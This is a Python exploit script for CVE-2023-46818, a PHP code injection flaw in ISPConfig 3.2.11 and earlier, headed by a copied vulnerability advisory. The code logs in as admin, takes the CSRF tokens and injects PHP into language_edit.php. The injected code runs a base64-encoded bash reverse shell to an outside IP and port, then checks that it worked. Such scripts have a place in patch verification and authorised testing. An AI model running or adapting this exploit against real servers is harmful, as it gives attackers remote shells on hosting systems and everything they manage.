#!/usr/bin/python
"""
------------------------------------------------------------------------
ISPConfig <= 3.2.11 (language_edit.php) PHP Code Injection Vulnerability
------------------------------------------------------------------------


[-] Software Link:

https://www.ispconfig.org


[-] Affected Versions:

Version 3.2.11 and prior versions.


[-] Vulnerabilities Description:

User input passed through the "records" POST parameter to
/admin/language_edit.php is not properly sanitized before being used
to dynamically generate PHP code that will be executed by the
application. This can be exploited by malicious administrator users to
inject and execute arbitrary PHP code on the web server.



[-] Solution:

Upgrade to version 3.2.11p1 or later.


[-] Disclosure Timeline:

[25/10/2023] - Vendor notified
[26/10/2023] - Version 3.2.11p1 released
[27/10/2023] - CVE identifier assigned
[07/12/2023] - Publication of this advisory


[-] CVE Reference:

The Common Vulnerabilities and Exposures project (cve.mitre.org)
has assigned the name CVE-2023-46818 to this vulnerability.


[-] Credits:

Vulnerability discovered by Egidio Romano.
https://packetstorm.news/files/id/176126
https://karmainsecurity.com/KIS-2023-13


[-] Other References:

https://www.ispconfig.org/blog/ispconfig-3-2-11p1-released/

"""


import requests
import base64
from bs4 import BeautifulSoup

url = "http://127.0.0.1:8080" #change url
username = "admin" #change username
password = "slowmotionapocalypse" #change password
payload = base64.b64encode("bash -c 'bash -i >& /dev/tcp/10.10.14.174/1337 0>&1'".encode('utf-8')).decode('utf-8') #change ip and port
php_inject = f"'];echo 'pwned';system('echo -n {payload} | base64 -d | bash');die;#"


session = requests.Session()

def login(session):
    session.post(url+"/login/", data={"username": username,"password": password, "s_mod": "login", "s_pg": "index"})
    if (session.get(url+"/datalogstatus.php").status_code == 200):
        print("[+] Login Success")
    else:
        print("[+] Login Failed")

def exploit(session, payload):
    response = session.get(url+"/admin/language_edit.php?lang_file=en_language_edit.lng&module=admin&lang=en")
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_id = soup.find("input", {"name": "_csrf_id"})
    csrf_key = soup.find("input", {"name": "_csrf_key"})
    if not csrf_id and not csrf_key:
        print("[+] Exploit Failed")
        exit()
    exploit = session.post(url+"/admin/language_edit.php", data={"lang": "en", "lang_file": "en_language_edit.lng", "module": "admin", "_csrf_id": csrf_id['value'], "_csrf_key": csrf_key['value'],"records[\]": payload})
    print("[+] Exploit Run")

def check_exploit(session):
    check = session.get(url+"/admin/lib/lang/en_language_edit.lng")
    if "pwned" in check.text:
        print("[+] Exploit Success")
        session.get(url+"/admin/language_edit.php?lang_file=en_language_edit.lng&module=admin&lang=en")
    else:
        print("[-] Exploit Failed")

if __name__ == "__main__":
    login(session)
    exploit(session, php_inject)
    check_exploit(session)
